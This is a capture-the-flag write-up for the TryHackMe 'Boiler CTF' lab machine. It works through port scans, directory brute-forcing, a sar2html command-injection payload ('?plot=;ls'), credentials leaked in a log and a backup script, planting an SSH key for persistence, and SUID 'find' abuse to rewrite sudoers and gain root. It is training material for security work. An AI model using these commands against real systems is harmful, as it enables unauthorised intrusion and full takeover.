# Boiler CTF
 
> Intermediate level CTF

https://tryhackme.com/room/boilerctf2


## nmap

```
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.11.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 81917E8F989F5624DEF9F32478A52FFE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Unix
```

```
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack
80/tcp    open  http             syn-ack
10000/tcp open  snet-sensor-mgmt syn-ack
55007/tcp open  unknown          syn-ack
```


## Port 80

Server: Apache/2.4.18 (Ubuntu)

http://10.10.98.133/joomla/


```sh
# gobuster dir -w /opt/directory-list-2.3-medium.txt -u 10.10.98.133
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.98.133
[+] Threads:        10
[+] Wordlist:       /opt/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/08 17:07:17 Starting gobuster
===============================================================
/manual (Status: 301)
/joomla (Status: 301)
/server-status (Status: 403)
===============================================================
2020/07/08 17:19:30 Finished
===============================================================
```

```sh
# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.98.133/joomla
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.98.133/joomla
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/08 17:33:46 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
/~www (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/installation (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/tmp (Status: 301)
===============================================================
2020/07/08 17:34:01 Finished
===============================================================
```


http://10.10.98.133/joomla/_files/

> VjJodmNITnBaU0JrWVdsemVRbz0K

```sh
kali@kali:~/thm/boilerctf2$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" |base64 -d
V2hvcHNpZSBkYWlzeQo=
kali@kali:~/thm/boilerctf2$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" |base64 -d|base64 -d
Whopsie daisy
```

http://10.10.98.133/joomla/administrator/


http://10.10.98.133/joomla/_test/

sar2html

https://www.exploit-db.com/exploits/47204

http://<ipaddr>/index.php?plot=;<command-here> will execute 

http://10.10.98.133/joomla/_test/?plot=;ls


http://10.10.98.133/joomla/_test/log.txt


Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.



basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$

```sh
# ssh basterd@10.10.98.133 -p 55007
basterd@10.10.98.133 password: superduperp@$$
(...)
Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)
```

```sh
$ cat backup.sh	
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	     echo "Begining copy of" $i  >> $LOG
	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	     echo $i "completed" >> $LOG
		
		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		    rm $SOURCE/$i
		    echo $i "removed" >> $LOG
		    echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

```sh
$ su stoner
Password: superduperp@$$no1knows
stoner@Vulnerable:/home/basterd$ id
uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

```sh
stoner@Vulnerable:~$ cat ~/.secret 
You made it till here, well done.
```


```sh
stoner@Vulnerable:/home/basterd$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```



```sh
stoner@Vulnerable:~$ mkdir .ssh
stoner@Vulnerable:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCesZ6G5OLixb/Znwg0s87l5qNJS7MxvfMeD8VJitnA5xEKP2OWOl+qIQP1DEYrYuv+qV0M8NmwjF+kxUTMCW5NiI/vHBQW3YS5jusPg5E+8R4lsJLxL+BDUgLOW6rxp/pgL7L/0KQzfeRp1OLVFKRtGK3ZMgWN2WxkqRbZbyvRlBofcESUZZVI0vTMXtU0HSpx4UdmeicL+P8Ph79Z5P0JF6Sx/q+gqhxuRKzwcjT+K/r9qiGJIIX9LDKkYA0nE8UrzU9jzw+rBA5WBuXen2zCOo8DSz4x6RvGSN1x3nG5nln49IPX/G4iKgYz09V6OgW4JF6BYYR2qWR/L+RdlPgdzp9IlWkMtPlDrFe4VQyz1Itp+8wFqSAQElHuydpR+hfMmLnQXAyGmsjN/C+twQ23Qhc5X4oneAycwj0OqNr4ewiUrnNAXvkpL7ZtFaVw7IkMo9M0e/xB8Le6WFMxiuDKfKbq4X8XodSNV87IoiDozRL7Jcx3u8q326Epu8CxP6ZiOymfxMHRpMvAnNtK6wJ+QVS+Ir0hVpgqJkAWBRLrxUbrBvE/QyOtb8qDimn2HgyCLaEp0s+VkQ1M9Ejt3aiSue4aGJrSPqJv1ZfV6DZ+vAbfSIoKyRN2FFv3vAfTB5b/yvUV1ZBdV8wG3oBalXSRAFlA9PFoClvVGcWYJ/3zXw== jiinx@kali" > ~/.ssh/authorized_keys
stoner@Vulnerable:~$ chmod 600 ~/.ssh/authorized_keys 
```

Upload de linpeas.sh

```
kali@kali:~/thm/boilerctf2$ scp -P 55007 linpeas.sh stoner@10.10.98.133:/home/stoner/linpeas.sh
```

SUID:
/usr/bin/find

https://gtfobins.github.io/gtfobins/find/#suid

```sh
stoner@Vulnerable:~$ find . -exec /bin/sh \; -quit
```
=> NOK

```sh
stoner@Vulnerable:~$ find . -exec whoami \; -quit
root
```

```sh
stoner@Vulnerable:~$ find . -exec visudo \; -quit
(...)
stoner  ALL=(root) NOPASSWD: /bin/bash
```
ou

```sh
find . -exec usermod -aG sudo stoner \;
```



```sh
stoner@Vulnerable:~$ sudo /bin/bash
root@Vulnerable:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
root@Vulnerable:/root# cat root.txt 
It wasn't that hard, was it?
```





## Port 55007

```
# telnet 10.10.98.133 55007
Trying 10.10.98.133...
Connected to 10.10.98.133.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

```sh
# ssh root@10.10.98.133 -p 55007
The authenticity of host '[10.10.98.133]:55007 ([10.10.98.133]:55007)' can't be established.
ECDSA key fingerprint is SHA256:mvrEiZlb4jqadxXJccZYZkCL/DHElLVQ74eKaSKZiRk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.98.133]:55007' (ECDSA) to the list of known hosts.
root@10.10.98.133's password: 
```

## Port 10000

http://10.10.98.133:10000/

Error - Document follows
This web server is running in SSL mode. Try the URL https://ip-10-10-98-133.eu-west-1.compute.internal:10000/ instead.

https://10.10.98.133:10000/

Server: MiniServ/1.930

admin:admin => NOK
admin:1234 => NOK

## Port 21

vsFTPd 3.0.3 

```
tp 10.10.98.133
Connected to 10.10.98.133.
220 (vsFTPd 3.0.3)
Name (10.10.98.133:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.

ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```


```sh
# cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

```sh
alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'"
# cat .info.txt | rot13
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

ou

https://rot13.com/